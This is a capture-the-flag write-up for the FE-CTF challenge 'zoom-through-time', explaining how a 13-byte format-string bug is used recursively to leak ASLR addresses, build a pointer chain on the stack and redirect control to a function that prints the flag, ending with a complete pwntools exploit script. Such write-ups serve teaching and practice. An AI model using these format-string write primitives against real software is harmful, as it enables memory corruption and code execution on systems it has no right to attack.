# Zoom Through Time

## Summary

This page is about the FE-CTF challenge *zoom-through-time*.

The goal of the challenge is to build up a linked list pointing at a function that will be called.
The heap where the inbuilt linked lists are put is write protected.

The input is bounded to 13 bytes, but the following `printf` is vulnerable.

A simple fix allows the input loop to become recursive allowing you to gather necessary addresses from the stack, as well as build up a linked list datastructure.

Finally we want to build a linked list that points at a method at `0x564FA9EC64DB` (which we will call `target`) which basically calls `system("/usr/bin/cat /flag")`.

## Data structure

In the start of the program two linked lists, 6 references deep, are created in heap allocated space. The last pointer of the first points at the input function, the last of the second points at an exit function.
After building the lists the heap page is then write protected with `mprotect`.

`main` then saves the pointers to each list in two global variables. It uses the function (`doExit`) that dereferences the input parameter 6 times to call the input function.

## Recursing

In the input function with the vulnerable `printf` the basic operation is:

1. Allocate some stack space for a pointer and a 13-byte buffer.
2. Store the pointer to the global variable containing the exit linked list on the stack.
3. Read input.
4. Printf that input.
5. Call `doExit` with the reference from the pointer variable on the stack.
6. `doExit` never returns, and normally the exit method would be called.

## Step 1

First step is to modify the global variable pointing to the exit method. Luckily for us the code that initializes the linked list datastructure page aligns the storage space for the linked lists.

Writing `%96d%6$hhn\0\0\0` to stdin will make the printf write 96 bytes, and then modify the lowest byte pointed at by the 6th argument to printf. Since the executable is using the Sys-V x86_64 calling convention the 6th argument is the current value pointed to by `RSP` containing the pointer to the global variable with the linked list to the exit function.

Now after printing some stuff `doExit` will simply call the input function again recursively, and a new prompt will appear.

## Stack layout when calling printf

| RSP offset  | Content  | Argument index |
|-------------|----------|----------------|
| +0x60  | Stack frame of previous input call | 18-23 |
| +0x30-0x5F | Stack frame of `doExit` | 12-17 |
| +0x28  | Return address |11|
| +0x20  | Frame pointer (pointing to `RSP+0x50`) |10|
| +0x18  | Stack cookie |9|
| +0x0B  | 13-byte buffer | 8 (if adding 5 byte padding to align to 16-byte boundary) |
| +0x00  | Pointer to global variable of exit linked list | 6 |

## Step 2 - Information

First step is gathering some addresses. The code is executed with `ASLR` so the bases will differ between runs.

First retrieve the pointer to the global variable pointing to the input function linked list. This will be contained in parameter index 25, and some other indices as it is stored in local variables in both the input function and `doExit`.

Conveniently in any recursion the return address (argument 11) will contain the return address to `doExit+0x2F`.
To calculate the address of our `target` method we have to add **666** to that address.

To do that we simply send `%11$p`

We can also calculate `RSP` by reading out the frame pointer (`%10$p`) and subtracting 80.

## Step 3 - Build linked list

Knowing the stack pointer it's possible to use the stack as our storage space for the linked list.

1. Push the absolute pointer to the `target` method by sending that value with 5 bytes prepended. It's not strictly necessary to align at this point, but the alignment will be important in another step.
2. Push a pointer to the previous pointer by keeping track of the current stack pointer. For each input iteration it will decrement by 96 bytes.
3. Repeat step 2 a total of 4 times.
4. Hold on to the last pointer to our stack linked list.

## Step 4 - Write pointer to global variable

We will want to write a pointer to our linked list on the stack. We can use the global variable pointing to the input linked list. We retrieved the pointer to this in step 2.

To write the full pointer we can write 2 bytes at a time:
1. Seed an absolute pointer to address+2*x by writing 5 bytes and followed by the address.
2. Write 2 bytes to that position by using for example `%123d%20$hn` to write `0x0x04D2`. Index 20 (index 8, and adding 12 which correspond to the stack frames of an input iteration) will refer to the address just written in the previous step.

## Step 5 - Swap out pointer passed to `doExit`

Since we can keep track of the `RSP` value for each iteration we can predict the value of the next iteration.

The goal at this point is to overwrite the local variable passed to `doExit` after doing the `printf`, we want to change that to point to the global variable that we modified in the previous step.

The address loaded to the local variable has the address `0x564FA9ECA088` while the variable we used to write a new pointer has the address `0x564FA9ECA0C8`. This differs only in the lowest byte meaning that is the only change we need to make.

So we do 2 steps:
1. Seed a pointer to `RSP-0x60` by writing that pointer with 5 prepended padding bytes.
2. Modify the lowest byte of that address to change from the modified exit global variable, to the global variable originally pointing to the input function which was rewritten to point to the stack linked list. This is done by writing `%200d%20$hhn`

## Step 6 - Read the flag

## Exploit code

```python
from pwn import *

context.log_level = "warning"

#p = process("./chal")
p = remote("zoom.hack.fe-ctf.dk", 1337)
try:
    p.recvuntil("?".encode("ascii"))
    p.recvuntil("> ".encode("ascii"))
    p.sendline("%6$96p%6$hhn".encode("ascii"))
    base = int(p.recvline().decode("ascii").strip(), base=0)

    current_rsp = 0

    def read(index):
        global current_rsp
        current_rsp -= 96
        p.recvuntil("> ".encode("ascii"))
        p.sendline("%{}$p".format(index).encode("ascii"))
        return int(p.recvline().decode("ascii").strip(), base=0)

    def seed(addr):
        global current_rsp
        p.recvuntil("> ".encode("ascii"))
        p.send(b"     " + pack(addr, 64))
        p.recvline()
        current_rsp -= 96
        return current_rsp + 16
    
    def write16(value, offset):
        global current_rsp
        if value <= 0:
            b = f"%{offset}$hn".encode("ascii").ljust(13, b"\0")
        else:
            b = f"%{value & 0xFFFF}d%{offset}$hn".encode("ascii").ljust(13, b"\0")
        p.recvuntil("> ".encode("ascii"))
        p.send(b)
        p.recvline()
        current_rsp -= 96
    
    def write8(value, offset):
        global current_rsp
        b = f"%{value & 0xFF}d%{offset}$hhn".encode("ascii").ljust(13, b"\0")
        p.recvuntil("> ".encode("ascii"))
        p.send(b)
        p.recvline()
        current_rsp -= 96

    # Gather info
    global_input_ptr = read(25)
    target_addr = read(11) + 666 # (doExit+0x2F) + 666
    current_rsp = read(10) - 80

    # Seed pointer chain on stack
    sp = seed(target_addr)
    sp = seed(sp)
    sp = seed(sp)
    sp = seed(sp)
    sp = seed(sp)

    # Write pointers to global input pointer variable
    for i2 in range(4):
        seed(global_input_ptr+i2*2)
        write16(sp >> (16*i2), 20)

    # Predict next stack variable and seed the address so we can overwrite it
    seed(current_rsp - 2*96)
    write8(0xC8, 20)

    p.recvuntil(b"flag")
    print("flag" + p.recvline().decode("ascii").strip())
finally:
    p.close()
```